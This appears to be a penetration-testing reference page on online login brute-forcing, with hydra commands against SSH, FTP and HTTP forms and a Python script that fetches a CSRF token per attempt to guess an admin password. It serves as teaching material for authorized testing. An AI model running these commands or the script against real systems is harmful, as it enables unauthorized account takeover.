# Online login checks

[← Passwords quick reference](../07-password-attacks.md)

Check the lockout policy and account scope before trying a password list. First establish one known failure response. A redirect alone can still be a failed login.

```bash
hydra -l <user> -P candidates.txt <target-ip> ssh -t 4
hydra -l <user> -P candidates.txt <target-ip> ftp -t 4
hydra -l <user> -P candidates.txt <target-ip> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Replace the form path, field names, and failure text with the real request. A form with a fresh CSRF token per request may require a script that fetches the token each time. The example below assumes a `csrf` field and a successful redirect specifically to `/dashboard`; change both to match the app.

```python
import re
import requests

url = "http://TARGET/login"
for password in open("candidates.txt", encoding="utf-8"):
    with requests.Session() as session:
        page = session.get(url)
        match = re.search(r'name="csrf" value="([^"]+)"', page.text)
        if not match:
            raise RuntimeError("CSRF token missing")
        response = session.post(
            url,
            data={"csrf": match.group(1), "username": "admin", "password": password.strip()},
            allow_redirects=False,
        )
        if response.status_code == 302 and response.headers.get("Location") == "/dashboard":
            print("Found:", password.strip())
            break
```

If every attempt appears successful, inspect a failure request, its token, and its redirect target before trusting the result.
